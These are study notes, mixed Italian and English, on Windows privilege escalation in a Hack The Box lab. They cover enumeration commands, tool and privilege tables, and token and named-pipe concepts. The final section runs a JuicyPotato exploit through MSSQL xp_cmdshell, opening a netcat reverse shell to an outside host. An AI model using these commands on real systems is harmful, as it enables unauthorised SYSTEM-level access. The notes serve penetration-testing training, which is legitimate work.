# Introduzione

Solitamente lo scopo di fare privesc su windows e' arrivare a utente **Local Administrator** o **NT AUTHORITY\SYSTEM**.
COME CONNETTERSI AI LAB: **xfreerdp /v:<target ip> /u:htb-student**

## Useful Tools
| Tool                                     | Description                                                                                                                                                                                                       |
|------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Seatbelt                                 | C# project for performing a wide variety of local privilege escalation checks                                                                                                                                   |
| winPEAS                                  | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained here                                                                              |
| PowerUp                                  | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found                                               |
| SharpUp                                  | C# version of PowerUp                                                                                                                                                                                           |
| JAWS                                     | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0                                                                                                                       |
| SessionGopher                            | PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information                                   |
| Watson                                   | .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities                                                                                                       |
| LaZagne                                  | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more |
| Windows Exploit Suggester - Next Generation (WES-NG) | Tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported |
| Sysinternals Suite                       | Includes tools like AccessChk, PipeList, and PsService for enumeration                                                                                                                                           |

Solitamente e' sempre conveniente scrivere i file in `C:\Windows\Temp` perche' abbiamo permessi di scrittura.


# Situational Awareness

We should always look at routing tables to view information about the local network and networks around it. We can also gather information about the local domain (if the host is part of an Active Directory environment), including the IP addresses of domain controllers. It is also important to use the arp command to view the ARP cache for each interface and view other hosts the host has recently communicated with. This could help us with lateral movement after obtaining credentials. It could be a good indication of which hosts administrators are connecting to via RDP or WinRM from this host.

`C:\htb> ipconfig /all`

`C:\htb> arp -a`

`C:\htb> route print` routing table

`PS C:\htb> Get-MpComputerStatus`

`PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` list applocker rules
`PS C:\htb> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`

# Initial Enumeration

## Key points
- **OS Name** and **Version** sono utili per capire cosa dobbiamo cercare e se ci sono exploit pubblici.
- **Running Services**. E' importante vedere quali servizi runnano, soprattutto runnati da local administrator o NT AUTHORITY/SYSTEM.

## System Information
`C:\htb> tasklist /svc`, tasklist ritorna i processi in esecuzione.
E' importante diventare familiari con i processi standard di windows come SMSS.exe, CSRSS.exe, winlogon.exe LSASS.exe e svchost.exe. e' importante perche'
cosi' potremo spottare subito processi non standard e potenzialmente vulnerabili.

## Display ALl Environment Variables
il comando **set** per printarle.
La variabile piu' comune da vedere e' **PATH**, e molto spesso gli amministratori la modificano.

`C:\htb> set`, lista tutte le variabili d' ambiente.

## Detailed Configuration Information
il comando **systeminfo** mostra se la box e' stata patchata di recente. se non lo e' stata potremmo semplicemente runnare un known exploit.
Google the KBs installed under HotFixes to get an idea of when the box has been patched. 
The System Boot Time and OS Version can also be checked to get an idea of the patch level.

`C:\htb> systeminfo`

## Patches and Updates
Se systeminfo non mostra gli hotfixes possiamo vederli con **WMI**

`C:\htb> wmic qfe` mostra le laetst patch

`PS C:\htb> Get-HotFix | ft -AutoSize` anche questo

## Installed Programs
WMI si puo' usare anche per vedere i software installati
`C:\htb> wmic product get name`
`PS C:\htb> Get-WmiObject -Class Win32_Product |  select Name, Version`, con powershell

## Display Running Processes
`PS C:\htb> netstat -ano`

## User & Group information
### Logged-In Users
`C:\htb> query user`, per vedere gli utenti.
### Current User
`C:\htb> echo %USERNAME%`

### Current User Privileges
`C:\htb> whoami /priv`

### Current User Group Information
`C:\htb> whoami /groups`

### Get All Users
`C:\htb> net user`

### Get All Groups
`C:\htb> net localgroup`

### Deatils about a specific group
`C:\htb> net localgroup administrators`

### Password Policy and Other account info
`C:\htb> net accounts`


# Communication With Processes
Uno dei posti migliori per privesc e' guardare i processi che runnano nel sistema. Anche se non stanno runnando da amminstratore possono portare a privesc
tipo se si exploita un servizio con SeImpersonateToken.

## Access Tokens
Gli access token sono usati per descrivere il security context (attributi di sicurezza di un process o thread).
Il token include informazioni sull' identita' dell' utente e i privilegi specifici di quel processo o thread.
Quando un utente si autentica la password viene verificata contro un database, e se si autentica gli viene assegnato un access token. Ogni volta che l'utente interagisce con un process una copia di quel token viene presentata ed associata al processo.

## Enumerating Network Services

Il metodo piu' comune per interagire con i processi e' tramite network socket (DNS,HTTP,SMB etc.etc.). **netstat** mostra le connessioni TCP e UDP attive.
Potremmo trovare servizi vulnerabili.

`C:\htb> netstat -ano`.

La cosa principale da guardare sono le entry che ascoltano nei loopback addresses (**127.0.0.1** e **::\1**) che non stanno ascoltando sull' indirizzo IP della rete o sul broadcast(0.0.0.0, ::/0).
Spesso queste cose sono insicure perche' non sono accessibili dalla rete.

**Splunk Universal Forwarder** esempio di privesc.

**Erlang Port (25672)** porta spesso usata come vettore di privesc. 

## Named Pipes
Un altro modo in cui i processi comunicano tra loro sono le **Named Pipes**. Essenzialmente sono file storati in memoria che vengono ripuliti dopo essere stati letti.

Cobalt strike usa Named Piped per ogni comando. spesso pero' si usa la named pipe di un altro processo per mascherarsi.

ci sono due tipi di Pipe: **Named** e **Anonymous piped**.

Named pipes can communicate using half-duplex, or a one-way channel with the client only being able to write data to the server, or duplex, which is a two-way communication channel that allows the client to write data over the pipe, and the server to respond back with data over that pipe.

`C:\htb> pipelist.exe /accepteula` per listare le istance di Named Pipes, Pipelist e' della sysinternal suite

`PS C:\htb>  gci \\.\pipe\` con powershell.

After obtaining a listing of named pipes, we can use Accesschk to enumerate the permissions assigned to a specific named pipe by reviewing the Discretionary Access List (DACL), which shows us who has the permissions to modify, write, read, or execute a resource. Let's take a look at the LSASS process. We can also review the DACLs of all named pipes using the command .\accesschk.exe /accepteula \pipe\.

accesschk.exe /accepteula \pipe\.

`C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v`

## Named Pipes Attack Example
Usando **accesschk** possiamo cercare tutte le named piped che ci danno permessi di scrittura

`accesschk.exe -w \pipe\* -v` comando per vedere le pipes con permessi di scrittura


# Windows Privilege Overview

## Windows Authorization Process
**Security Principals** sono qualsiasi cosa che puo' essere autenticata dal sistema operativo Windows.(computer, utenti, processi etc.etc.).

Ogni singolo Security Principal e' identificat da un unico **Security Identifier (SID)**, e appena creato un security principal gli viene assegnato il SID e gli rimane a vita.

Quando un utente prova ad accedere ad un oggetto (directory/file etc.etc.) tutte le info dell' utente come il suo SID, il SID dei gruppi di cui fa parte etc.etc. viene comparato con ogni entry della **Access Control Entries (ACEs)** finche' si trova un match e dopo si fa una decisione.


## Right and Privileges in Windows

| Group                        | Description                                                                                                                                                                                                                                                                                                  |
|------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Default Administrators       | Domain Admins and Enterprise Admins are "super" groups.                                                                                                                                                                                                                                                     |
| Server Operators             | Members can modify services, access SMB shares, and backup files.                                                                                                                                                                                                                                           |
| Backup Operators             | Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.              |
| Print Operators              | Members can log on to DCs locally and "trick" Windows into loading a malicious driver.                                                                                                                                                                                                                      |
| Hyper-V Administrators       | If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.                                                                                                                                                                         |
| Account Operators            | Members can modify non-protected accounts and groups in the domain.                                                                                                                                                                                                                                         |
| Remote Desktop Users         | Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.                                                                                                           |
| Remote Management Users      | Members can log on to DCs with PSRemoting. This group is sometimes added to the local remote management group on non-DCs.                                                                                                                                                                                    |
| Group Policy Creator Owners  | Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.                                                                                                                                                                        |
| Schema Admins                | Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.                                                                                                                                                 |
| DNS Admins                   | Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record. |

## User rights assignment

| Setting Constant              | Setting Name                               | Standard Assignment                 | Description                                                                                                                                                                                                                                    |
|-------------------------------|--------------------------------------------|-------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| SeNetworkLogonRight           | Access this computer from the network     | Administrators, Authenticated Users | Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.                                                                                                |
| SeRemoteInteractiveLogonRight | Allow log on through Remote Desktop Services | Administrators, Remote Desktop Users | Determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection but not log on to the console of the same server.         |
| SeBackupPrivilege             | Back up files and directories             | Administrators                      | Determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.                                                                                             |
| SeSecurityPrivilege           | Manage auditing and security log          | Administrators                      | Determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These users can also view and clear the Security log in Event Viewer.                       |
| SeTakeOwnershipPrivilege      | Take ownership of files or other objects  | Administrators                      | Determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.                                         |
| SeDebugPrivilege              | Debug programs                            | Administrators                      | Determines which users can attach to or open any process, even a process they do not own. This user right provides access to sensitive and critical operating system components.                                                                |
| SeImpersonatePrivilege        | Impersonate a client after authentication | Administrators, Local Service, Network Service, Service | Determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.                                                                                                                       |
| SeLoadDriverPrivilege         | Load and unload device drivers            | Administrators                      | Determines which users can dynamically load and unload device drivers. This is not required if a signed driver already exists in the device's driver.cab file.                                                                                |
| SeRestorePrivilege            | Restore files and directories             | Administrators                      | Determines which users can bypass file, directory, registry, and other persistent object permissions when restoring backed-up files and directories. It also allows users to set valid security principals as the owner of an object.           |


Molti permessi sono visibili solo quando si runna una shell elevata. Questo concetto di elevazione dei privilegi e UAC si usa per limitare le azioni sensibli solo quando realmente necessarie.

Quando un privilegio compare come **disabled** significa che questo utente ha questo privilegio pero' non possiamo usarlo negli access token finche' non e' enabled.

Non esistono built-in commands per abilitare i privilegi disabled ma con un po' di scripting si puo' fare: https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1.

### Standard user rights
```
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### Backup operators rights
Questo gruppo ha anche altri privilegi che pero' UAC restringe.
```
Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
### Detection
This post(https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e) is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event 4672: Special privileges assigned to new logon which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should never be assigned or those that should only ever be assigned to specific accounts.


# SeImpersonate and SeAssignPrimaryToken
Ogni processo in windows ha un token assegnato che contiene informazioni sull' utente che l'ha runnato.

Se noi riusciamo a rubare un Token di SYSTEM e abbiamo il privilegio **SeImpersonate**(spesso posseduto da utenti di servizi) possiamo creare un processo con un token (con la Win32API **CreateProcessWithTokenW**).

**SeAssignPrimaryTokenPrivilege** serve invece per assegnare un token ad un processo . serve per eseguire **CreateProcessAsUser**

Alcuni programmi legittimi fanno cio' ovvero richiedono al processo SYSTEM **WinLogon** un token di SYSTEM e impersonano system per fare azioni privilegiate.

Questi sono i cosiddetti **potato style** attacks.

Exploiting juicy potato con una shell su mssql usando mssqlclient.py from the Impacket toolkit.
**-p** e' il processo da eseguire e **-a** gli argomenti:

`j4k1dibe@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth`

`SQL> enable_xp_cmdshell`

`SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`

